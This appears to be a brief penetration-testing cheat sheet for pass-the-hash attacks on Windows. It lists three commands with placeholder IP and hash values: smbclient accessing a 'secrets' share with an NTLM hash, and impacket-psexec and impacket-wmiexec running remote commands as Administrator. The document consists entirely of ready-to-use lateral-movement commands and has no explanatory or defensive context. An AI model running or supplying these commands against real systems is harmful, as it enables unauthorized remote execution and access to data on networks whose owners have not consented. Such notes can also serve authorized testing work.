smbclient
```
smbclient \\\\192.168.x.x\\secrets -U Administrator --pw-nt-hash NTLMHASH
```

psexec
```
impacket-psexec -hashes 00000000000000000000000000000000:NTLMHASH Administrator@192.168.x.x
```

wmiexec
```
impacket-wmiexec -hashes 00000000000000000000000000000000:NTLMHASH Administrator@192.168.x.x
```